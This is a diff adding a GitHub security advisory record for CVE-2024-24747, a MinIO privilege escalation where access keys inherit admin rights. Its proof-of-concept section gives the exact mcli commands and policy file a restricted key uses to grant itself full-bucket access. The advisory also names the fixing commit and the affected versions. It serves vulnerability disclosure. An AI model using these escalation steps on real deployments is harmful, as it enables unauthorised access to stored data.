@@ -1,0 +1,69 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-xx8w-mq23-29g4",
+  "modified": "2024-02-01T22:52:18Z",
+  "published": "2024-02-01T19:21:30Z",
+  "aliases": [
+    "CVE-2024-24747"
+  ],
+  "summary": "Minio unsafe default: Access keys inherit `admin` of root user, allowing privilege escalation",
+  "details": "### Summary\nWhen someone creates an access key, it inherits the permissions of the parent key. Not only for \n`s3:*` actions, but also `admin:*` actions. Which means unless somewhere above in the \naccess-key hierarchy, the `admin` rights are denied, access keys will be able to simply \noverride their own `s3` permissions to something more permissive.\n\nCredit to @xSke for sort of accidentally discovering this. I only understood the implications.\n\n### Details / PoC\nWe spun up the latest version of minio in a docker container and signed in to the admin UI \nusing the minio root user. We created two buckets, `public` and `private` and created an \naccess key called `mycat` and attached the following policy to only allow access to the \nbucket called `public`.\n\n```json\n{\n \"Version\": \"2012-10-17\",\n \"Statement\": [\n  {\n   \"Effect\": \"Allow\",\n   \"Action\": [\n    \"s3:*\"\n   ],\n   \"Resource\": [\n    \"arn:aws:s3:::public\",\n    \"arn:aws:s3:::public/*\"\n   ]\n  }\n ]\n}\n```\nWe then set an alias in mc:  `mcli alias set vuln http://localhost:9001 mycat mycatiscute` \n\nAnd checked whether policy works:\n```\nA ~/c/minio-vuln mcli ls vuln\n[0001-01-01 00:53:28 LMT]     0B public/\n```\nLooks good, we believe this is how 99% of users will work with access policies.\n\nIf I now create a file `full-access-policy.json`:\n```json\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"s3:*\"\n      ],\n      \"Resource\": [\n        \"arn:aws:s3:::*\"\n      ]\n    }\n  ]\n}\n```\nAnd then:\n\n```sh\nA ~/c/minio-vuln mcli admin user svcacct edit --policy full-access-policy.json vuln mycat\nEdited service account `mycat` successfully.\n```\n`mycat` has escalated its privileges to get access to the entire deployment: \n```sh\nA ~/c/minio-vuln mcli ls vuln\n[0001-01-01 00:53:28 LMT]     0B private/\n[0001-01-01 00:53:28 LMT]     0B public/\n```\n\n### Impact\nA trivial privilege escalation unless the operator fully understands that they need to \nexplicitly deny `admin` actions on access keys. \n\n### Patched\n\n```\ncommit 0ae4915a9391ef4b3ec80f5fcdcf24ee6884e776 (HEAD -> master, origin/master)\nAuthor: Aditya Manthramurthy <donatello@users.noreply.github.com>\nDate:   Wed Jan 31 10:56:45 2024 -0800\n\n    fix: permission checks for editing access keys (#18928)\n    \n    With this change, only a user with `UpdateServiceAccountAdminAction`\n    permission is able to edit access keys.\n    \n    We would like to let a user edit their own access keys, however the\n    feature needs to be re-designed for better security and integration with\n    external systems like AD/LDAP and OpenID.\n    \n    This change prevents privilege escalation via service accounts.\n```\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/minio/minio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.0-20240131185645-0ae4915a9391"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/minio/minio/security/advisories/GHSA-xx8w-mq23-29g4"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-24747"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/minio/minio/commit/0ae4915a9391ef4b3ec80f5fcdcf24ee6884e776"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/minio/minio"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/minio/minio/releases/tag/RELEASE.2024-01-31T20-20-33Z"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-269"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-02-01T19:21:30Z",
+    "nvd_published_at": "2024-01-31T22:15:54Z"
+  }
+}
